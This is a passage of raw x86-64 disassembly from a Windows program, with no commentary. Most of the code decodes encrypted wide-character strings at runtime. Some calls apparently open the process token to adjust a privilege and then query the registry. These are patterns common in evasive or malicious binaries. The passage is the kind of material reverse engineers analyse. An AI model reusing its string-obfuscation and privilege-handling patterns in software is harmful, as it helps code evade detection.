   140005ad1:	03 05 91 8d 28 00    	add    0x288d91(%rip),%eax        # 0x14028e868
   140005ad7:	0f b6 c0             	movzbl %al,%eax
   140005ada:	66 89 05 87 8d 28 00 	mov    %ax,0x288d87(%rip)        # 0x14028e868
   140005ae1:	0f b7 05 82 8d 28 00 	movzwl 0x288d82(%rip),%eax        # 0x14028e86a
   140005ae8:	05 d5 00 00 00       	add    $0xd5,%eax
   140005aed:	0f b6 c0             	movzbl %al,%eax
   140005af0:	66 89 05 73 8d 28 00 	mov    %ax,0x288d73(%rip)        # 0x14028e86a
   140005af7:	c6 05 6e 8d 28 00 00 	movb   $0x0,0x288d6e(%rip)        # 0x14028e86c
   140005afe:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140005b03:	4c 8d 0d 26 8d 28 00 	lea    0x288d26(%rip),%r9        # 0x14028e830
   140005b0a:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140005b11:	31 c9                	xor    %ecx,%ecx
   140005b13:	4d 89 f8             	mov    %r15,%r8
   140005b16:	e8 d5 d2 ff ff       	call   0x140002df0
   140005b1b:	80 3d 97 83 28 00 00 	cmpb   $0x0,0x288397(%rip)        # 0x14028deb9
   140005b22:	0f 84 38 1f 00 00    	je     0x140007a60
   140005b28:	80 3d 7d 8d 28 00 00 	cmpb   $0x0,0x288d7d(%rip)        # 0x14028e8ac
   140005b2f:	0f 84 da 00 00 00    	je     0x140005c0f
   140005b35:	f3 0f 7e 15 33 8d 28 	movq   0x288d33(%rip),%xmm2        # 0x14028e870
   140005b3c:	00 
   140005b3d:	66 0f 6f 05 5b 4e 00 	movdqa 0x4e5b(%rip),%xmm0        # 0x14000a9a0
   140005b44:	00 
   140005b45:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005b49:	66 0f 6f 0d 0f 4b 00 	movdqa 0x4b0f(%rip),%xmm1        # 0x14000a660
   140005b50:	00 
   140005b51:	66 0f db d1          	pand   %xmm1,%xmm2
   140005b55:	f3 0f 7e 1d 1b 8d 28 	movq   0x288d1b(%rip),%xmm3        # 0x14028e878
   140005b5c:	00 
   140005b5d:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005b61:	66 0f db d9          	pand   %xmm1,%xmm3
   140005b65:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005b69:	f3 0f 7f 15 ff 8c 28 	movdqu %xmm2,0x288cff(%rip)        # 0x14028e870
   140005b70:	00 
   140005b71:	f3 0f 7e 15 07 8d 28 	movq   0x288d07(%rip),%xmm2        # 0x14028e880
   140005b78:	00 
   140005b79:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005b7d:	66 0f db d1          	pand   %xmm1,%xmm2
   140005b81:	f3 0f 7e 1d ff 8c 28 	movq   0x288cff(%rip),%xmm3        # 0x14028e888
   140005b88:	00 
   140005b89:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005b8d:	66 0f db d9          	pand   %xmm1,%xmm3
   140005b91:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005b95:	f3 0f 7f 15 e3 8c 28 	movdqu %xmm2,0x288ce3(%rip)        # 0x14028e880
   140005b9c:	00 
   140005b9d:	f3 0f 7e 15 eb 8c 28 	movq   0x288ceb(%rip),%xmm2        # 0x14028e890
   140005ba4:	00 
   140005ba5:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005ba9:	66 0f db d1          	pand   %xmm1,%xmm2
   140005bad:	f3 0f 7e 1d e3 8c 28 	movq   0x288ce3(%rip),%xmm3        # 0x14028e898
   140005bb4:	00 
   140005bb5:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005bb9:	66 0f db d9          	pand   %xmm1,%xmm3
   140005bbd:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005bc1:	f3 0f 7f 15 c7 8c 28 	movdqu %xmm2,0x288cc7(%rip)        # 0x14028e890
   140005bc8:	00 
   140005bc9:	f3 0f 7e 15 cf 8c 28 	movq   0x288ccf(%rip),%xmm2        # 0x14028e8a0
   140005bd0:	00 
   140005bd1:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005bd5:	66 0f db d1          	pand   %xmm1,%xmm2
   140005bd9:	66 0f d6 15 bf 8c 28 	movq   %xmm2,0x288cbf(%rip)        # 0x14028e8a0
   140005be0:	00 
   140005be1:	8b 05 c1 8c 28 00    	mov    0x288cc1(%rip),%eax        # 0x14028e8a8
   140005be7:	83 c0 33             	add    $0x33,%eax
   140005bea:	0f b6 c0             	movzbl %al,%eax
   140005bed:	66 89 05 b4 8c 28 00 	mov    %ax,0x288cb4(%rip)        # 0x14028e8a8
   140005bf4:	0f b7 05 af 8c 28 00 	movzwl 0x288caf(%rip),%eax        # 0x14028e8aa
   140005bfb:	83 c0 33             	add    $0x33,%eax
   140005bfe:	0f b6 c0             	movzbl %al,%eax
   140005c01:	66 89 05 a2 8c 28 00 	mov    %ax,0x288ca2(%rip)        # 0x14028e8aa
   140005c08:	c6 05 9d 8c 28 00 00 	movb   $0x0,0x288c9d(%rip)        # 0x14028e8ac
   140005c0f:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140005c14:	4c 8d 0d 55 8c 28 00 	lea    0x288c55(%rip),%r9        # 0x14028e870
   140005c1b:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140005c22:	31 c9                	xor    %ecx,%ecx
   140005c24:	4d 89 f8             	mov    %r15,%r8
   140005c27:	e8 c4 d1 ff ff       	call   0x140002df0
   140005c2c:	80 3d 87 82 28 00 00 	cmpb   $0x0,0x288287(%rip)        # 0x14028deba
   140005c33:	0f 84 58 1e 00 00    	je     0x140007a91
   140005c39:	80 3d a8 8c 28 00 00 	cmpb   $0x0,0x288ca8(%rip)        # 0x14028e8e8
   140005c40:	0f 84 b3 00 00 00    	je     0x140005cf9
   140005c46:	f3 0f 7e 15 62 8c 28 	movq   0x288c62(%rip),%xmm2        # 0x14028e8b0
   140005c4d:	00 
   140005c4e:	66 0f 6f 05 5a 4d 00 	movdqa 0x4d5a(%rip),%xmm0        # 0x14000a9b0
   140005c55:	00 
   140005c56:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005c5a:	66 0f 6f 0d fe 49 00 	movdqa 0x49fe(%rip),%xmm1        # 0x14000a660
   140005c61:	00 
   140005c62:	66 0f db d1          	pand   %xmm1,%xmm2
   140005c66:	f3 0f 7e 1d 4a 8c 28 	movq   0x288c4a(%rip),%xmm3        # 0x14028e8b8
   140005c6d:	00 
   140005c6e:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005c72:	66 0f db d9          	pand   %xmm1,%xmm3
   140005c76:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005c7a:	f3 0f 7f 15 2e 8c 28 	movdqu %xmm2,0x288c2e(%rip)        # 0x14028e8b0
   140005c81:	00 
   140005c82:	f3 0f 7e 15 36 8c 28 	movq   0x288c36(%rip),%xmm2        # 0x14028e8c0
   140005c89:	00 
   140005c8a:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005c8e:	66 0f db d1          	pand   %xmm1,%xmm2
   140005c92:	f3 0f 7e 1d 2e 8c 28 	movq   0x288c2e(%rip),%xmm3        # 0x14028e8c8
   140005c99:	00 
   140005c9a:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005c9e:	66 0f db d9          	pand   %xmm1,%xmm3
   140005ca2:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005ca6:	f3 0f 7f 15 12 8c 28 	movdqu %xmm2,0x288c12(%rip)        # 0x14028e8c0
   140005cad:	00 
   140005cae:	f3 0f 7e 15 1a 8c 28 	movq   0x288c1a(%rip),%xmm2        # 0x14028e8d0
   140005cb5:	00 
   140005cb6:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005cba:	66 0f db d1          	pand   %xmm1,%xmm2
   140005cbe:	f3 0f 7e 1d 12 8c 28 	movq   0x288c12(%rip),%xmm3        # 0x14028e8d8
   140005cc5:	00 
   140005cc6:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005cca:	66 0f db d9          	pand   %xmm1,%xmm3
   140005cce:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005cd2:	f3 0f 7f 15 f6 8b 28 	movdqu %xmm2,0x288bf6(%rip)        # 0x14028e8d0
   140005cd9:	00 
   140005cda:	f3 0f 7e 15 fe 8b 28 	movq   0x288bfe(%rip),%xmm2        # 0x14028e8e0
   140005ce1:	00 
   140005ce2:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005ce6:	66 0f db d1          	pand   %xmm1,%xmm2
   140005cea:	66 0f d6 15 ee 8b 28 	movq   %xmm2,0x288bee(%rip)        # 0x14028e8e0
   140005cf1:	00 
   140005cf2:	c6 05 ef 8b 28 00 00 	movb   $0x0,0x288bef(%rip)        # 0x14028e8e8
   140005cf9:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140005cfe:	4c 8d 0d ab 8b 28 00 	lea    0x288bab(%rip),%r9        # 0x14028e8b0
   140005d05:	48 8d 95 60 12 00 00 	lea    0x1260(%rbp),%rdx
   140005d0c:	31 c9                	xor    %ecx,%ecx
   140005d0e:	4d 89 f8             	mov    %r15,%r8
   140005d11:	e8 da d0 ff ff       	call   0x140002df0
   140005d16:	80 3d 9e 81 28 00 00 	cmpb   $0x0,0x28819e(%rip)        # 0x14028debb
   140005d1d:	0f 84 9f 1d 00 00    	je     0x140007ac2
   140005d23:	80 3d fe 8b 28 00 00 	cmpb   $0x0,0x288bfe(%rip)        # 0x14028e928
   140005d2a:	0f 84 b3 00 00 00    	je     0x140005de3
   140005d30:	f3 0f 7e 15 b8 8b 28 	movq   0x288bb8(%rip),%xmm2        # 0x14028e8f0
   140005d37:	00 
   140005d38:	66 0f 6f 05 80 4c 00 	movdqa 0x4c80(%rip),%xmm0        # 0x14000a9c0
   140005d3f:	00 
   140005d40:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005d44:	66 0f 6f 0d 14 49 00 	movdqa 0x4914(%rip),%xmm1        # 0x14000a660
   140005d4b:	00 
   140005d4c:	66 0f db d1          	pand   %xmm1,%xmm2
   140005d50:	f3 0f 7e 1d a0 8b 28 	movq   0x288ba0(%rip),%xmm3        # 0x14028e8f8
   140005d57:	00 
   140005d58:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005d5c:	66 0f db d9          	pand   %xmm1,%xmm3
   140005d60:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005d64:	f3 0f 7f 15 84 8b 28 	movdqu %xmm2,0x288b84(%rip)        # 0x14028e8f0
   140005d6b:	00 
   140005d6c:	f3 0f 7e 15 8c 8b 28 	movq   0x288b8c(%rip),%xmm2        # 0x14028e900
   140005d73:	00 
   140005d74:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005d78:	66 0f db d1          	pand   %xmm1,%xmm2
   140005d7c:	f3 0f 7e 1d 84 8b 28 	movq   0x288b84(%rip),%xmm3        # 0x14028e908
   140005d83:	00 
   140005d84:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005d88:	66 0f db d9          	pand   %xmm1,%xmm3
   140005d8c:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005d90:	f3 0f 7f 15 68 8b 28 	movdqu %xmm2,0x288b68(%rip)        # 0x14028e900
   140005d97:	00 
   140005d98:	f3 0f 7e 15 70 8b 28 	movq   0x288b70(%rip),%xmm2        # 0x14028e910
   140005d9f:	00 
   140005da0:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005da4:	66 0f db d1          	pand   %xmm1,%xmm2
   140005da8:	f3 0f 7e 1d 68 8b 28 	movq   0x288b68(%rip),%xmm3        # 0x14028e918
   140005daf:	00 
   140005db0:	66 0f fd d8          	paddw  %xmm0,%xmm3
   140005db4:	66 0f db d9          	pand   %xmm1,%xmm3
   140005db8:	66 0f 6c d3          	punpcklqdq %xmm3,%xmm2
   140005dbc:	f3 0f 7f 15 4c 8b 28 	movdqu %xmm2,0x288b4c(%rip)        # 0x14028e910
   140005dc3:	00 
   140005dc4:	f3 0f 7e 15 54 8b 28 	movq   0x288b54(%rip),%xmm2        # 0x14028e920
   140005dcb:	00 
   140005dcc:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005dd0:	66 0f db d1          	pand   %xmm1,%xmm2
   140005dd4:	66 0f d6 15 44 8b 28 	movq   %xmm2,0x288b44(%rip)        # 0x14028e920
   140005ddb:	00 
   140005ddc:	c6 05 45 8b 28 00 00 	movb   $0x0,0x288b45(%rip)        # 0x14028e928
   140005de3:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   140005de8:	4c 8d 0d 01 8b 28 00 	lea    0x288b01(%rip),%r9        # 0x14028e8f0
   140005def:	45 31 e4             	xor    %r12d,%r12d
   140005df2:	4c 8d ad 60 12 00 00 	lea    0x1260(%rbp),%r13
   140005df9:	31 c9                	xor    %ecx,%ecx
   140005dfb:	4c 89 ea             	mov    %r13,%rdx
   140005dfe:	4d 89 f8             	mov    %r15,%r8
   140005e01:	e8 ea cf ff ff       	call   0x140002df0
   140005e06:	f3 0f 6f 05 8e 4d 00 	movdqu 0x4d8e(%rip),%xmm0        # 0x14000ab9c
   140005e0d:	00 
   140005e0e:	66 0f 7f 85 80 16 00 	movdqa %xmm0,0x1680(%rbp)
   140005e15:	00 
   140005e16:	48 c7 85 f8 16 00 00 	movq   $0x0,0x16f8(%rbp)
   140005e1d:	00 00 00 00 
   140005e21:	4c 8d 85 f8 16 00 00 	lea    0x16f8(%rbp),%r8
   140005e28:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   140005e2f:	ba 28 00 00 00       	mov    $0x28,%edx
   140005e34:	e8 ca b6 ff ff       	call   0x140001503
   140005e39:	85 c0                	test   %eax,%eax
   140005e3b:	78 37                	js     0x140005e74
   140005e3d:	48 8b 8d f8 16 00 00 	mov    0x16f8(%rbp),%rcx
   140005e44:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140005e48:	f3 0f 7f 44 24 20    	movdqu %xmm0,0x20(%rsp)
   140005e4e:	4c 8d 85 80 16 00 00 	lea    0x1680(%rbp),%r8
   140005e55:	31 d2                	xor    %edx,%edx
   140005e57:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140005e5d:	e8 ec b6 ff ff       	call   0x14000154e
   140005e62:	85 c0                	test   %eax,%eax
   140005e64:	41 0f 99 c4          	setns  %r12b
   140005e68:	48 8b 8d f8 16 00 00 	mov    0x16f8(%rbp),%rcx
   140005e6f:	e8 ea b5 ff ff       	call   0x14000145e
   140005e74:	48 c7 85 20 17 00 00 	movq   $0x0,0x1720(%rbp)
   140005e7b:	00 00 00 00 
   140005e7f:	80 3d 0c 80 28 00 00 	cmpb   $0x0,0x28800c(%rip)        # 0x14028de92
   140005e86:	0f 84 67 1c 00 00    	je     0x140007af3
   140005e8c:	80 3d f9 80 28 00 00 	cmpb   $0x0,0x2880f9(%rip)        # 0x14028df8c
   140005e93:	0f 84 60 01 00 00    	je     0x140005ff9
   140005e99:	66 0f 6f 05 2f 4b 00 	movdqa 0x4b2f(%rip),%xmm0        # 0x14000a9d0
   140005ea0:	00 
   140005ea1:	66 0f 6f 15 47 80 28 	movdqa 0x288047(%rip),%xmm2        # 0x14028def0
   140005ea8:	00 
   140005ea9:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005ead:	66 0f 6f 0d 6b 47 00 	movdqa 0x476b(%rip),%xmm1        # 0x14000a620
   140005eb4:	00 
   140005eb5:	66 0f db d1          	pand   %xmm1,%xmm2
   140005eb9:	66 0f 7f 15 2f 80 28 	movdqa %xmm2,0x28802f(%rip)        # 0x14028def0
   140005ec0:	00 
   140005ec1:	66 0f 6f 15 37 80 28 	movdqa 0x288037(%rip),%xmm2        # 0x14028df00
   140005ec8:	00 
   140005ec9:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005ecd:	66 0f db d1          	pand   %xmm1,%xmm2
   140005ed1:	66 0f 7f 15 27 80 28 	movdqa %xmm2,0x288027(%rip)        # 0x14028df00
   140005ed8:	00 
   140005ed9:	66 0f 6f 15 2f 80 28 	movdqa 0x28802f(%rip),%xmm2        # 0x14028df10
   140005ee0:	00 
   140005ee1:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005ee5:	66 0f db d1          	pand   %xmm1,%xmm2
   140005ee9:	66 0f 7f 15 1f 80 28 	movdqa %xmm2,0x28801f(%rip)        # 0x14028df10
   140005ef0:	00 
   140005ef1:	66 0f 6f 15 27 80 28 	movdqa 0x288027(%rip),%xmm2        # 0x14028df20
   140005ef8:	00 
   140005ef9:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005efd:	66 0f db d1          	pand   %xmm1,%xmm2
   140005f01:	66 0f 7f 15 17 80 28 	movdqa %xmm2,0x288017(%rip)        # 0x14028df20
   140005f08:	00 
   140005f09:	66 0f 6f 15 1f 80 28 	movdqa 0x28801f(%rip),%xmm2        # 0x14028df30
   140005f10:	00 
   140005f11:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005f15:	66 0f db d1          	pand   %xmm1,%xmm2
   140005f19:	66 0f 7f 15 0f 80 28 	movdqa %xmm2,0x28800f(%rip)        # 0x14028df30
   140005f20:	00 
   140005f21:	66 0f 6f 15 17 80 28 	movdqa 0x288017(%rip),%xmm2        # 0x14028df40
   140005f28:	00 
   140005f29:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005f2d:	66 0f db d1          	pand   %xmm1,%xmm2
   140005f31:	66 0f 7f 15 07 80 28 	movdqa %xmm2,0x288007(%rip)        # 0x14028df40
   140005f38:	00 
   140005f39:	66 0f 6f 15 0f 80 28 	movdqa 0x28800f(%rip),%xmm2        # 0x14028df50
   140005f40:	00 
   140005f41:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005f45:	66 0f db d1          	pand   %xmm1,%xmm2
   140005f49:	66 0f 7f 15 ff 7f 28 	movdqa %xmm2,0x287fff(%rip)        # 0x14028df50
   140005f50:	00 
   140005f51:	66 0f 6f 15 07 80 28 	movdqa 0x288007(%rip),%xmm2        # 0x14028df60
   140005f58:	00 
   140005f59:	66 0f fd d0          	paddw  %xmm0,%xmm2
   140005f5d:	66 0f db d1          	pand   %xmm1,%xmm2
   140005f61:	66 0f 7f 15 f7 7f 28 	movdqa %xmm2,0x287ff7(%rip)        # 0x14028df60
   140005f68:	00 
   140005f69:	66 0f fd 05 ff 7f 28 	paddw  0x287fff(%rip),%xmm0        # 0x14028df70
   140005f70:	00 
   140005f71:	66 0f db c1          	pand   %xmm1,%xmm0
   140005f75:	66 0f 7f 05 f3 7f 28 	movdqa %xmm0,0x287ff3(%rip)        # 0x14028df70
   140005f7c:	00 
   140005f7d:	8b 05 fd 7f 28 00    	mov    0x287ffd(%rip),%eax        # 0x14028df80
   140005f83:	83 c0 0b             	add    $0xb,%eax
   140005f86:	0f b6 c0             	movzbl %al,%eax
   140005f89:	66 89 05 f0 7f 28 00 	mov    %ax,0x287ff0(%rip)        # 0x14028df80
   140005f90:	0f b7 05 eb 7f 28 00 	movzwl 0x287feb(%rip),%eax        # 0x14028df82
   140005f97:	83 c0 0b             	add    $0xb,%eax
   140005f9a:	0f b6 c0             	movzbl %al,%eax
   140005f9d:	66 89 05 de 7f 28 00 	mov    %ax,0x287fde(%rip)        # 0x14028df82
   140005fa4:	8b 05 da 7f 28 00    	mov    0x287fda(%rip),%eax        # 0x14028df84
   140005faa:	83 c0 0b             	add    $0xb,%eax
   140005fad:	0f b6 c0             	movzbl %al,%eax
   140005fb0:	66 89 05 cd 7f 28 00 	mov    %ax,0x287fcd(%rip)        # 0x14028df84
   140005fb7:	0f b7 05 c8 7f 28 00 	movzwl 0x287fc8(%rip),%eax        # 0x14028df86
   140005fbe:	83 c0 0b             	add    $0xb,%eax
   140005fc1:	0f b6 c0             	movzbl %al,%eax
   140005fc4:	66 89 05 bb 7f 28 00 	mov    %ax,0x287fbb(%rip)        # 0x14028df86
   140005fcb:	8b 05 b7 7f 28 00    	mov    0x287fb7(%rip),%eax        # 0x14028df88
   140005fd1:	83 c0 0b             	add    $0xb,%eax
   140005fd4:	0f b6 c0             	movzbl %al,%eax
   140005fd7:	66 89 05 aa 7f 28 00 	mov    %ax,0x287faa(%rip)        # 0x14028df88
   140005fde:	0f b7 05 a5 7f 28 00 	movzwl 0x287fa5(%rip),%eax        # 0x14028df8a
   140005fe5:	83 c0 0b             	add    $0xb,%eax
   140005fe8:	0f b6 c0             	movzbl %al,%eax
   140005feb:	66 89 05 98 7f 28 00 	mov    %ax,0x287f98(%rip)        # 0x14028df8a
   140005ff2:	c6 05 93 7f 28 00 00 	movb   $0x0,0x287f93(%rip)        # 0x14028df8c
   140005ff9:	48 c7 85 00 17 00 00 	movq   $0x0,0x1700(%rbp)
   140006000:	00 00 00 00 
   140006004:	4c 8d 3d e5 7e 28 00 	lea    0x287ee5(%rip),%r15        # 0x14028def0
   14000600b:	4c 89 f9             	mov    %r15,%rcx
   14000600e:	e8 dd 3c 00 00       	call   0x140009cf0
   140006013:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   14000601a:	01 c0                	add    %eax,%eax
   14000601c:	66 89 8d 02 17 00 00 	mov    %cx,0x1702(%rbp)
   140006023:	66 89 85 00 17 00 00 	mov    %ax,0x1700(%rbp)
   14000602a:	4c 89 bd 08 17 00 00 	mov    %r15,0x1708(%rbp)
   140006031:	66 0f ef c0          	pxor   %xmm0,%xmm0
   140006035:	66 0f 7f 85 70 14 00 	movdqa %xmm0,0x1470(%rbp)
   14000603c:	00 
   14000603d:	66 0f 7f 85 80 14 00 	movdqa %xmm0,0x1480(%rbp)
   140006044:	00 
   140006045:	c7 85 70 14 00 00 30 	movl   $0x30,0x1470(%rbp)
   14000604c:	00 00 00 
   14000604f:	c7 85 88 14 00 00 40 	movl   $0x40,0x1488(%rbp)
   140006056:	00 00 00 
   140006059:	4c 89 b5 80 14 00 00 	mov    %r14,0x1480(%rbp)
   140006060:	66 0f 7f 85 90 14 00 	movdqa %xmm0,0x1490(%rbp)
   140006067:	00 
   140006068:	48 8d 8d 20 17 00 00 	lea    0x1720(%rbp),%rcx
   14000606f:	4c 8d 85 70 14 00 00 	lea    0x1470(%rbp),%r8
   140006076:	ba 01 00 00 00       	mov    $0x1,%edx
   14000607b:	e8 fb b4 ff ff       	call   0x14000157b
   140006080:	85 c0                	test   %eax,%eax
   140006082:	0f 88 12 01 00 00    	js     0x14000619a
   140006088:	48 8d 8d 50 10 00 00 	lea    0x1050(%rbp),%rcx
   14000608f:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140006095:	31 d2                	xor    %edx,%edx
   140006097:	e8 34 3d 00 00       	call   0x140009dd0
   14000609c:	80 3d f0 7d 28 00 00 	cmpb   $0x0,0x287df0(%rip)        # 0x14028de93
   1400060a3:	0f 84 79 1b 00 00    	je     0x140007c22
   1400060a9:	80 3d f4 7e 28 00 00 	cmpb   $0x0,0x287ef4(%rip)        # 0x14028dfa4
   1400060b0:	74 47                	je     0x1400060f9
   1400060b2:	66 0f 6f 05 d6 7e 28 	movdqa 0x287ed6(%rip),%xmm0        # 0x14028df90
   1400060b9:	00 
   1400060ba:	66 0f fd 05 7e 45 00 	paddw  0x457e(%rip),%xmm0        # 0x14000a640
   1400060c1:	00 
   1400060c2:	66 0f db 05 56 45 00 	pand   0x4556(%rip),%xmm0        # 0x14000a620
   1400060c9:	00 
   1400060ca:	66 0f 7f 05 be 7e 28 	movdqa %xmm0,0x287ebe(%rip)        # 0x14028df90
   1400060d1:	00 
   1400060d2:	66 0f 6f 05 c6 7e 28 	movdqa 0x287ec6(%rip),%xmm0        # 0x14028dfa0
   1400060d9:	00 
   1400060da:	66 0f fd 05 9e 45 00 	paddw  0x459e(%rip),%xmm0        # 0x14000a680
   1400060e1:	00 
   1400060e2:	66 0f db 05 a6 45 00 	pand   0x45a6(%rip),%xmm0        # 0x14000a690
   1400060e9:	00 
   1400060ea:	66 0f 7e 05 ae 7e 28 	movd   %xmm0,0x287eae(%rip)        # 0x14028dfa0
   1400060f1:	00 
   1400060f2:	c6 05 ab 7e 28 00 00 	movb   $0x0,0x287eab(%rip)        # 0x14028dfa4
   1400060f9:	48 c7 85 40 17 00 00 	movq   $0x0,0x1740(%rbp)
   140006100:	00 00 00 00 
   140006104:	4c 8d 3d 85 7e 28 00 	lea    0x287e85(%rip),%r15        # 0x14028df90
   14000610b:	4c 89 f9             	mov    %r15,%rcx
   14000610e:	e8 dd 3b 00 00       	call   0x140009cf0
   140006113:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   14000611a:	01 c0                	add    %eax,%eax
   14000611c:	66 89 8d 42 17 00 00 	mov    %cx,0x1742(%rbp)
   140006123:	66 89 85 40 17 00 00 	mov    %ax,0x1740(%rbp)
   14000612a:	4c 89 bd 48 17 00 00 	mov    %r15,0x1748(%rbp)
   140006131:	48 8b 8d 20 17 00 00 	mov    0x1720(%rbp),%rcx
   140006138:	4c 8d b5 38 17 00 00 	lea    0x1738(%rbp),%r14
   14000613f:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140006144:	c7 44 24 20 00 02 00 	movl   $0x200,0x20(%rsp)
   14000614b:	00 
   14000614c:	48 8d 95 40 17 00 00 	lea    0x1740(%rbp),%rdx
   140006153:	4c 8d 8d 50 10 00 00 	lea    0x1050(%rbp),%r9
   14000615a:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140006160:	e8 43 b4 ff ff       	call   0x1400015a8
   140006165:	85 c0                	test   %eax,%eax
   140006167:	78 25                	js     0x14000618e
   140006169:	48 8d 95 5c 10 00 00 	lea    0x105c(%rbp),%rdx
   140006170:	44 8b 85 58 10 00 00 	mov    0x1058(%rbp),%r8d
   140006177:	41 d1 e8             	shr    $1,%r8d
   14000617a:	48 8d 8d 20 0a 00 00 	lea    0xa20(%rbp),%rcx
   140006181:	e8 fa 3b 00 00       	call   0x140009d80
   140006186:	85 c0                	test   %eax,%eax
   140006188:	0f 84 03 08 00 00    	je     0x140006991
   14000618e:	48 8b 8d 20 17 00 00 	mov    0x1720(%rbp),%rcx
   140006195:	e8 c4 b2 ff ff       	call   0x14000145e
   14000619a:	80 3d 1b 7d 28 00 00 	cmpb   $0x0,0x287d1b(%rip)        # 0x14028debc
   1400061a1:	0f 84 91 19 00 00    	je     0x140007b38
   1400061a7:	80 3d ce 87 28 00 00 	cmpb   $0x0,0x2887ce(%rip)        # 0x14028e97c
   1400061ae:	0f 84 f0 00 00 00    	je     0x1400062a4
   1400061b4:	66 0f 6f 05 44 48 00 	movdqa 0x4844(%rip),%xmm0        # 0x14000aa00
   1400061bb:	00 
   1400061bc:	66 0f 6f 0d 6c 87 28 	movdqa 0x28876c(%rip),%xmm1        # 0x14028e930
   1400061c3:	00 
   1400061c4:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400061c8:	66 0f 6f 15 50 44 00 	movdqa 0x4450(%rip),%xmm2        # 0x14000a620
   1400061cf:	00 
   1400061d0:	66 0f db ca          	pand   %xmm2,%xmm1
   1400061d4:	66 0f 7f 0d 54 87 28 	movdqa %xmm1,0x288754(%rip)        # 0x14028e930
   1400061db:	00 
   1400061dc:	66 0f 6f 0d 5c 87 28 	movdqa 0x28875c(%rip),%xmm1        # 0x14028e940
   1400061e3:	00 
   1400061e4:	66 0f fd c8          	paddw  %xmm0,%xmm1
   1400061e8:	66 0f db ca          	pand   %xmm2,%xmm1
   1400061ec:	66 0f 7f 0d 4c 87 28 	movdqa %xmm1,0x28874c(%rip)        # 0x14028e940
   1400061f3:	00 
   1400061f4:	66 0f 6f 0d 54 87 28 	movdqa 0x288754(%rip),%xmm1        # 0x14028e950
   1400061fb:	00 
   1400061fc:	66 0f fd c8          	paddw  %xmm0,%xmm1
   140006200:	66 0f db ca          	pand   %xmm2,%xmm1
   140006204:	66 0f 7f 0d 44 87 28 	movdqa %xmm1,0x288744(%rip)        # 0x14028e950
   14000620b:	00 
   14000620c:	66 0f fd 05 4c 87 28 	paddw  0x28874c(%rip),%xmm0        # 0x14028e960
   140006213:	00 
   140006214:	66 0f db c2          	pand   %xmm2,%xmm0
   140006218:	66 0f 7f 05 40 87 28 	movdqa %xmm0,0x288740(%rip)        # 0x14028e960
   14000621f:	00 
   140006220:	b8 f3 00 00 00       	mov    $0xf3,%eax
   140006225:	8b 0d 45 87 28 00    	mov    0x288745(%rip),%ecx        # 0x14028e970
   14000622b:	01 c1                	add    %eax,%ecx
   14000622d:	0f b6 c9             	movzbl %cl,%ecx
   140006230:	66 89 0d 39 87 28 00 	mov    %cx,0x288739(%rip)        # 0x14028e970
   140006237:	0f b7 0d 34 87 28 00 	movzwl 0x288734(%rip),%ecx        # 0x14028e972
   14000623e:	81 c1 f3 00 00 00    	add    $0xf3,%ecx
   140006244:	0f b6 c9             	movzbl %cl,%ecx
   140006247:	66 89 0d 24 87 28 00 	mov    %cx,0x288724(%rip)        # 0x14028e972
   14000624e:	8b 0d 20 87 28 00    	mov    0x288720(%rip),%ecx        # 0x14028e974
   140006254:	01 c1                	add    %eax,%ecx
   140006256:	0f b6 c9             	movzbl %cl,%ecx
   140006259:	66 89 0d 14 87 28 00 	mov    %cx,0x288714(%rip)        # 0x14028e974
   140006260:	0f b7 0d 0f 87 28 00 	movzwl 0x28870f(%rip),%ecx        # 0x14028e976
   140006267:	81 c1 f3 00 00 00    	add    $0xf3,%ecx
   14000626d:	0f b6 c9             	movzbl %cl,%ecx
   140006270:	66 89 0d ff 86 28 00 	mov    %cx,0x2886ff(%rip)        # 0x14028e976
